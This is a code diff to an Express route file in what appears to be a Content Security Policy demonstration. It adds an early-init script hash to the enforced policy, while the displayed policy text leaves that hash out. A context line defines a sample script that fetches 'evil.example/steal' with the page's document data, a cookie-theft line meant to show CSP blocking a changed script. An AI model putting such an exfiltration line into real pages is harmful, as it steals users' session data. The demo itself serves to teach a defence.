@@ -1,6 +1,6 @@
 import type { Response } from 'express';
 import express from 'express';
-import { csp, formatDirectives, hashScript } from '../../csp';
+import { csp, EARLY_INIT_HASH, formatDirectives, hashScript } from '../../csp';
 import { render } from '../../render';
 
 const router = express.Router();
@@ -10,9 +10,9 @@ const DIFFERENT_SCRIPT_CONTENT = `fetch('https://evil.example/steal?c=' + docume
 const SCRIPT_HASH = hashScript(HASH_SCRIPT_CONTENT);
 const DIFFERENT_SCRIPT_HASH = hashScript(DIFFERENT_SCRIPT_CONTENT);
 
-const HASH_DIRECTIVES = { 'script-src': `'self' '${SCRIPT_HASH}'` };
+const HASH_DIRECTIVES = { 'script-src': `'self' '${SCRIPT_HASH}' '${EARLY_INIT_HASH}'` };
 const CSP_HEADER = csp(HASH_DIRECTIVES);
-const CSP_DISPLAY = formatDirectives(HASH_DIRECTIVES);
+const CSP_DISPLAY = formatDirectives({ 'script-src': `'self' '${SCRIPT_HASH}'` });
 const EXPLANATION = `CSP is active on both pages. The script only runs if its content hashes to the value in the policy — any change, even a single character, produces a different hash and gets blocked. The policy allows <code>${HASH_SCRIPT_CONTENT}</code> (hash: <code>${SCRIPT_HASH}</code>).`;
 
 function hashHandler(withHash: boolean) {
